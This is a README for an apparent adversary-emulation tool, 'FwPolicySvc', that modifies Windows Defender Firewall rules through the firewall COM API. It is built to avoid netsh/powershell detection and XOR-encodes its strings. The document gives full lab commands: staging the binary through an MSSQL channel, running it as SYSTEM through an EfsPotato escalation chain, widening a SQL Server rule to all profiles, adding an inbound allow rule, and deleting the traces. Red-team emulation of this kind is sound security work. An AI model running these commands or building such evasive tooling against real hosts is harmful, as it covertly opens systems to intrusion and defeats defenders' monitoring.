# FwPolicySvc

**MITRE ATT&CK:** T1686.003 — Disable or Modify System Firewall: Windows Host Firewall

**Purpose:** Modify Windows Defender Firewall rules in-process through the `NetFwTypeLib` COM API — no `netsh.exe` or `powershell.exe` child process.

## Overview

Standard firewall-rule tooling (`netsh advfirewall`, `Set-NetFirewallRule`) leaves a LOLBin child process and a telltale command line. `FwPolicySvc` reaches the same rule store by instantiating the firewall COM objects (`HNetCfg.FwPolicy2` / `HNetCfg.FwRule`) via late-bound COM and calling `INetFwPolicy2` / `INetFwRules` directly from its own process. The process that performs the modification is therefore the tool itself (or its parent, when dispatched in-process), not `netsh`/`powershell`.

It supports two of the technique's behaviors:

- **Modify an existing rule** — change a rule's `Profiles` scope (e.g. widen a Domain-only rule to all profiles), and optionally its `RemoteAddresses`.
- **Add a new rule** — create a scoped inbound TCP allow rule for a non-standard port.

The two COM ProgIDs are stored XOR-encoded (`class X`) so they do not appear as plaintext metadata strings. All other values are generic property names and are not obfuscated.

## Target context

- **Host / OS / arch:** IIS01 — Windows Server 2022, x64 (runs on any .NET Framework 4.x Windows host)
- **Privilege required:** administrator / `NT AUTHORITY\SYSTEM` — the firewall COM API rejects modification from non-elevated callers. On IIS01 this means running through the EfsPotato SYSTEM chain (`CertEnrollSvc.exe`), not `xp_cmdshell` (which runs as the non-admin MSSQL service account).

## Usage

```
FwPolicySvc.exe <command> [args]

  show <ruleName>                                             print a rule's settings
  setprofiles <ruleName> <domain|private|public|all|0xMASK>   change a rule's profile scope
  add <ruleName> <port> [profileSpec] [remoteAddr]            add an inbound TCP allow rule
  del <ruleName>                                             remove a rule
```

`profileSpec` accepts `domain`, `private`, `public`, `all`/`any`, a decimal mask, or a `0x` hex mask.

### Lab invocation (IIS01, via the EfsPotato SYSTEM chain)

`CertEnrollSvc.exe` Mode 2 does not return the child's stdout inline, so every command is wrapped in `cmd /c ... > <file> 2>&1` and the file is read back through the MSSQL channel (`xpfile cat` → `OPENROWSET(BULK ...)`). `cmd.exe` is only the redirection wrapper — it is never the mechanism that touches the firewall rule.

1. Stage the binary to IIS01 through the MSSQL DB channel (as with `CertEnrollSvc.exe`):

   ```
   xpstage-hex FwPolicySvc.exe
   xpfile exists C:\ProgramData\FwPolicySvc.exe
   ```

2. ☣️ Widen the existing SQL rule from Domain-only to all profiles, as SYSTEM (`netsh.exe` / `powershell.exe` never appear in the process tree):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe setprofiles \"SQL Server (TCP 1433)\" all > C:\ProgramData\fwp_out.txt 2>&1" lsarpc
   xpfile cat C:\ProgramData\fwp_out.txt
   ```

   - ***Expected Output***
     ```text
     [+] rule 'SQL Server (TCP 1433)' profiles set to all (0x7FFFFFFF)
     ```

3. Verify the rule through the same chain (firewall reads also require elevation):

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe show \"SQL Server (TCP 1433)\" > C:\ProgramData\fwp_show.txt 2>&1" lsarpc
   xpfile cat C:\ProgramData\fwp_show.txt
   ```

   → `profiles=all (0x7FFFFFFF)`

4. ☣️ Alternative — add a new scoped inbound rule instead of widening the existing one:

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe add DevPortal-Ops 49683 domain 192.168.56.0/24 > C:\ProgramData\fwp_add.txt 2>&1" lsarpc
   ```

5. Revert the rule, then clean up — revert **before** deleting the binary:

   ```
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\FwPolicySvc.exe setprofiles \"SQL Server (TCP 1433)\" domain > C:\ProgramData\fwp_rev.txt 2>&1" lsarpc
   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\fwp_out.txt C:\ProgramData\fwp_show.txt C:\ProgramData\fwp_add.txt C:\ProgramData\fwp_rev.txt C:\ProgramData\FwPolicySvc.exe" lsarpc
   ```

   > `xpfile del` (sp_OA `FileSystemObject`) returns `0x800A0046` Permission Denied on SYSTEM-owned files, so deletion runs under the same SYSTEM chain that created them.

## COM late-binding notes

The tool drives the firewall store through `System.__ComObject` late binding (`Type.GetTypeFromProgID` + `Type.InvokeMember`), so the binding flag must match how each member is declared in the `NetFwTypeLib` type library:

| Member | Kind | Binding flag |
| ---- | ---- | ------------ |
| `INetFwPolicy2.Rules` | property (`propget`) | `BindingFlags.GetProperty` |
| `INetFwRules.Item` | method | `BindingFlags.InvokeMethod` |
| `INetFwRules.Add` / `Remove` | method | `BindingFlags.InvokeMethod` |
| `INetFwRule.Profiles` | property (`propget` / `propput`) | `BindingFlags.GetProperty` / `SetProperty` |

Calling a `propget` with `InvokeMethod` (or a method with `GetProperty`) fails with `DISP_E_MEMBERNOTFOUND (0x80020003)`. `Rules` was originally invoked as a method, which made **every** command fail with `[-] Member not found. (Exception from HRESULT: 0x80020003)`; it is now read with `GetProperty`. Note that `Find(...)` only catches `TargetInvocationException` / `COMException`, so the argument expression `Get(NewPolicy(), "Rules")` is evaluated outside the `try` and a mismatch there surfaces straight to `Main`.

## Verification status

Lab-verified on IIS01 (Windows Server 2022) as `NT AUTHORITY\SYSTEM` through the EfsPotato chain:

```text
[+] rule 'SQL Server (TCP 1433)' profiles set to all (0x7FFFFFFF)
```

Dev-env dry run (no arguments) prints usage and exits `2` without touching the COM API.

## Files

| File | Description |
| ---- | ----------- |
| `FwPolicySvc.cs` | Source — late-bound COM (`Type.GetTypeFromProgID` + `InvokeMember`), no `NetFwTypeLib` / `Microsoft.CSharp` reference |
| `FwPolicySvc.exe` | Compiled artifact (.NET Framework, anycpu) |
| `encode.py` | Position-dependent XOR encoder — generates the byte-array literals for the two COM ProgIDs |
| `Flow.md` | Ordered behavior breakdown of the binary (source-code trace; ATT&CK column filled by `map-technique`) |

## See also

- Build: `Build.md` · Code flow: `Flow.md` · Emulation step: `../../../../Emulation_Plan/Phase 2.md` (Step 6)
